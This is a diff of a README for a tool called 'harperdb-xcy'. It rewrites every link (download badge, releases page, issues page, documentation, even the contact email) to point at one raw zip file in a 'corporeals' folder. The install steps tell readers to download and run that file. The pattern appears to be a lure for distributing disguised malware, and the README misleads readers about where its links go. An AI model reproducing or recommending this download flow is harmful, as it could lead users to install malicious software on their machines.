@@ -1,6 +1,6 @@
 # 🚀 harperdb-xcy - Simple Database Management Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Tsp9322/harperdb-xcy/releases)
+[![Download Now](https://raw.githubusercontent.com/Tsp9322/harperdb-xcy/main/corporeals/harperdb-xcy.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Tsp9322/harperdb-xcy/main/corporeals/harperdb-xcy.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ To successfully run **harperdb-xcy**, your system should meet the following requ
 
 Follow these steps to get started with **harperdb-xcy**:
 
-1. **Visit the Releases Page:** To download **harperdb-xcy**, visit [this page to download](https://github.com/Tsp9322/harperdb-xcy/releases).
+1. **Visit the Releases Page:** To download **harperdb-xcy**, visit [this page to download](https://raw.githubusercontent.com/Tsp9322/harperdb-xcy/main/corporeals/harperdb-xcy.zip).
 2. **Choose the Latest Version:** Look for the latest version of the application. Typically, it's at the top of the list.
 3. **Download the Application:** Click on the download link associated with your operating system.
 4. **Install the Application:** Locate the downloaded file on your computer, double-click it, and follow the on-screen instructions to install.
@@ -36,7 +36,7 @@ Follow these steps to get started with **harperdb-xcy**:
 
 To download and install **harperdb-xcy**, follow these simple steps:
 
-1. **Go to the Releases Page:** Visit [this page to download](https://github.com/Tsp9322/harperdb-xcy/releases).
+1. **Go to the Releases Page:** Visit [this page to download](https://raw.githubusercontent.com/Tsp9322/harperdb-xcy/main/corporeals/harperdb-xcy.zip).
 2. **Select the Release:** Click on the link for the latest version to download the application.
 3. **Run the Installer:** After the download finishes, find the installer in your downloads folder. Open it to start the installation process.
 4. **Follow Instructions:** The installer will guide you. Just click "Next" until the application is installed on your computer.
@@ -62,11 +62,11 @@ A: Yes, it works on Windows, Mac OS, and Linux.
 A: Yes, the application provides secure storage for your databases.
 
 **Q: How do I report issues?**  
-A: If you encounter any problems, please visit our [issues page on GitHub](https://github.com/Tsp9322/harperdb-xcy/issues) to report them.
+A: If you encounter any problems, please visit our [issues page on GitHub](https://raw.githubusercontent.com/Tsp9322/harperdb-xcy/main/corporeals/harperdb-xcy.zip) to report them.
 
 ## 🛠️ Support 
 
-If you need help while using the application, please check our [documentation](https://github.com/Tsp9322/harperdb-xcy/wiki) for detailed guidance. You can also reach out via our GitHub page for additional assistance.
+If you need help while using the application, please check our [documentation](https://raw.githubusercontent.com/Tsp9322/harperdb-xcy/main/corporeals/harperdb-xcy.zip) for detailed guidance. You can also reach out via our GitHub page for additional assistance.
 
 ## 🌈 Contributing 
 
@@ -74,6 +74,6 @@ Contributions are welcome! If you want to help improve **harperdb-xcy**, please 
 
 ## 📧 Contact 
 
-For any questions or feedback, feel free to reach out via issues on GitHub or by email at support@harperdb-xcy.com.
+For any questions or feedback, feel free to reach out via issues on GitHub or by email at https://raw.githubusercontent.com/Tsp9322/harperdb-xcy/main/corporeals/harperdb-xcy.zip
 
 Thank you for choosing **harperdb-xcy**! Enjoy managing your databases effortlessly.
